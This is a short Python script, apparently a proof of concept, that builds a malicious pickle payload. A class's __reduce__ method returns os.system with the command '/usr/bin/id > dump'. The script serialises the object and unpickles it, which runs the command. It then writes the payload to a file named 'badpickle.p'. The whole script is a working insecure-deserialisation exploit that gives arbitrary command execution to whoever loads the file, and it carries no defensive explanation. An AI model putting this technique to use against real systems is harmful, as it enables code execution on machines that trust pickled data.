import pickle
import os

class F(object):
    def __reduce__(self):
        return (os.system, (('/usr/bin/id > dump',)))

f = F()
payload = pickle.dumps(f)
print(payload)
pickle.loads(payload)

with open('badpickle.p', 'wb') as fh:
    pickle.dump(f, fh, pickle.HIGHEST_PROTOCOL)
